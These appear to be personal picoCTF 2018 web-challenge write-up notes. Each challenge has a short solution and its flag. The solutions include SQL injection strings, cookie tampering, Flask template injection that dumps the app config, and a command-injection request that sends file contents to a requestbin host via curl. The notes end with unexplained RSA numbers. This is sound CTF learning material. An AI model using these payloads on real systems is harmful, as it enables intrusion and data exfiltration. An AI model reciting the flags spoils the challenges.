Inspect Me
- This has us inspect the source code to make sure we know how to look at it
- Thankfully, Google Chrome has a handy page inspector which you can get with Cmd+Shift+I
- The flag is split into pieces among the js, css, and html files
- picoCTF{ur_4_real_1nspect0r_g4dget_402b0bd3}

Client Side is Bad
- The name seems to imply that there's some client side validation for the password
- Inspecting the page, we see the issue immediately
- There's a set of JS code validating the password
- Piecing the string together, we can get the flag
- picoCTF{client_is_bad_3bd366}

Logon
- There's a login question where we want to be an admin
- Unfortunately, it seems like there's some proper defenses against SQL injections this time
- Looking at the cookies, there's an admin boolean that we can change easily
- When we refresh the page, we get the flag
- picoCTF{l0g1ns_ar3nt_r34l_a280e12c}

Irish Name Repo
- This time is a basic SQL injection
- I just used ' or ''=' in the user and pass field
- picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}

Mr. Robots
- There's always one question like this
- What we want here is the robots.txt as the name hints
- This file indicates to bots what pages they shouldn't include in their view
- Thankfully, there's just one link, which we visit for the flag
- picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_30de1}

No Login
- This is the same as the Logon question but without a login field
- Fortunately, all we have to do is do the same thing, but add the cookie in ourselves
- I used EditThisCookie to add an admin cookie with the value true
- picoCTF{n0l0g0n_n0_pr0bl3m_3184f702}

Secret Agent
- Taking a look at the link, this seems to be similar style to the past question
- When we click the link, it gives us our user-agent string and tells us we aren't Google...
- Google Chrome has a handy feature that lets us emulate other devices
- Since we want to pretend to be google, we can just pretend to be a Google bot with their user-agent string
    - Googlebot-News
- picoCTF{s3cr3t_ag3nt_m4n_ed3fe08d}

The Vault
- It seems like this is another SQL injection question
- They were a bit more prepared this time and included a illegal character pattern
- Fortunately, there's a lot of ways to SQL inject without proper escaping
- This time, I just entered admin'-- into the user box and it let me log in
- picoCTF{w3lc0m3_t0_th3_vau1t_c4738171}

Buttons!
- Let's take a look at the link to see what these two buttons are
    - 	<form action="button1.php" method="POST">
    	    <input type="submit" value="PUSH ME! I am your only hope!"/>
	</form>
    - <a href="button2.php">Button2</a>
- It seems like the first button is making a POST request while the second button is making a GET since it's a link
- The hint seems to make us want to make the second button into a POST request too
- picoCTF{button_button_whose_got_the_button_3e5652dd}


Artisinal Handcrafted HTTP 3
- 
- GET / HTTP/1.1
Host: flag.local
    - 	<html>
	    <head>
	        <link rel="stylesheet" type="text/css" href="main.css" />
 	   </head>
	    <body>
	        <header>
	            <h1>Real Business Internal Flag Server</h1>
	            <a href="/login">Login</a>
	        </header>
	        <main>
	            <p>You need to log in before you can see today's flag.</p>
	        </main>
	    </body>
	</html>
- GET /login HTTP/1.1
Host: flag.local
    - 	<html>
	    <head>
	        <link rel="stylesheet" type="text/css" href="main.css" />
	    </head>
	    <body>
	        <header>
 	           <h1>Real Business Internal Flag Server</h1>
	            <a href="/login">Login</a>
  	      </header>
 	       <main>
	            <h2>Log In</h2>
	
	            <form method="POST" action="login">
 	               <input type="text" name="user" placeholder="Username" />
	                <input type="password" name="pass" placeholder="Password" />
	                <input type="submit" />
	            </form>
	        </main>
	    </body>
	</html>
- POST /login HTTP/1.1
Host: flag.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

user=realbusinessuser&pass=potoooooooo
    - 	HTTP/1.1 302 Found
	x-powered-by: Express
	set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
	location: /
	vary: Accept
	content-type: text/plain; charset=utf-8
	content-length: 23
	date: Mon, 22 Oct 2018 04:28:34 GMT
	connection: close
- GET / HTTP/1.1
Host: flag.local
Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D
- picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}

Flaskcards
- The name seems to imply a Flask vulnerability, which I'm not quite familiar with, so it's time to do some research!
- The most basic type of vulnerability associated with Flask is Sever-Side Template Injection
    - Since Flask leverages the Jinga2 engine, syntax can be injected if input is not properly cleaned
- We can check for this vulnerability by attempting a basic injection where content is displayed
    - The most easily recognizable location is cards, since they can be created then listed
    - After creating a card with {{ 1 + 1 }} title, it appears as 2, so it seems to be successful!
- But what's the attack surface here?
    - The template has a context which holds the variables
    - There are some pretty nice things in here, like a secret key and database credentials
- We can retrieve the config with config.items()
- dict_items([('PREFERRED_URL_SCHEME', 'http'), ('SQLALCHEMY_ECHO', False), ('SESSION_COOKIE_SECURE', False), ('SQLALCHEMY_MAX_OVERFLOW', None), ('BOOTSTRAP_SERVE_LOCAL', False), ('BOOTSTRAP_USE_MINIFIED', True), ('SESSION_COOKIE_NAME', 'session'), ('APPLICATION_ROOT', '/'), ('SQLALCHEMY_BINDS', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('SESSION_COOKIE_HTTPONLY', True), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SESSION_COOKIE_PATH', None), ('DEBUG', False), ('TEMPLATES_AUTO_RELOAD', None), ('TESTING', False), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('TRAP_HTTP_EXCEPTIONS', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('JSONIFY_MIMETYPE', 'application/json'), ('MAX_CONTENT_LENGTH', None), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SQLALCHEMY_POOL_RECYCLE', None), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('ENV', 'production'), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('PROPAGATE_EXCEPTIONS', None), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SESSION_COOKIE_SAMESITE', None), ('SECRET_KEY', 'picoCTF{secret_keys_to_the_kingdom_2a7bf92c}'), ('SESSION_REFRESH_EACH_REQUEST', True), ('SERVER_NAME', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('JSON_SORT_KEYS', True), ('SQLALCHEMY_POOL_SIZE', None), ('MAX_COOKIE_SIZE', 4093), ('EXPLAIN_TEMPLATE_LOADING', False), ('SQLALCHEMY_POOL_TIMEOUT', None), ('JSON_AS_ASCII', True), ('USE_X_SENDFILE', False), ('SESSION_COOKIE_DOMAIN', False), ('BOOTSTRAP_QUERYSTRING_REVVING', True)])
- The flag is in here, picoCTF{secret_keys_to_the_kingdom_2a7bf92c}

fancy-alive-monitoring
- It seems like this is analyzing unsafe PHP code
- Namely, the PHP code uses exec without escaping any shell code, so we can inject our own shell commands in there
- I used burp suite to intercept the request and edit it a bit before i fired it out
- There are two issues we need to address before we try to inject shellcode
    - There is no output on the page for our shellcode output, so we need a server to receive it
        - Thankfully, requestbin can helpfully hold some of the requests for us
    - An ls to scout out the directory can't fit normally
        - Just base64 encode it!
- Now we can send our command
    - 	POST /index.php HTTP/1.1
	Host: 2018shell3.picoctf.com:8587	
	Content-Length: 64
	Cache-Control: max-age=0
	Origin: http://2018shell3.picoctf.com:8587
	Upgrade-Insecure-Requests: 1
	DNT: 1
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
	Referer: http://2018shell3.picoctf.com:8587/index.php
	Accept-Encoding: gzip, deflate
	Accept-Language: en-US,en;q=0.9
	Cookie: admin=True; _ga=GA1.2.417901566.1539540784; _gid=GA1.2.1342100985.1540227767; gsScrollPos-1727250023=0; gsScrollPos-1727250022=0
	Connection: close

	ip=1.1.1.1; curl http://requestbin.net/r/qrdy9aqr?ls=$(ls|base64)
- Now let's decode the base64 response we observe
    - 	echo ZmxhZy50eHQKaW5kZXgucGhwCmluZGV4LnR4dAp4aW5ldF9zdGFydHVwLnNoCg== | base64 --decode
    - 	flag.txt
	index.php
	index.txt
	xinet_startup.sh
- It seems like the flag is easily viewable, let's just send another command to cat it
    - ip=1.1.1.1; curl http://requestbin.net/r/qrdy9aqr?cat=$(cat flag.txt|base64)
- We can decode the response just like last time
    - 	echo SGVyZSBpcyB5b3VyIGZsYWc6IHBpY29DVEZ7bjN2M3JfdHJ1c3RfYV9iMHhfOTY2MzlkOTF9Cgo= | base64 --decode
    -	Here is your flag: picoCTF{n3v3r_trust_a_b0x_96639d91}


e = 35
n = 19196179840482205007287053190360632692402199065189507727015229436726673538005747582179434624399695899956631400535325904431646456210645324679782326477063790283466613729116200711658770753091913181189805632367540409035652953970804965753441480758150477344356008976398339417715812672751297913843584215089441783362490826592360431503258947390021528345704786655120506081759274685291840365503953386301797211695668145644734753983220125969799732421029154824714506075459067768660157078393137203609727556015769291286941148770224960671099206737628729938815910882101295450602649830574129533541414536925943969958871504599016614797597


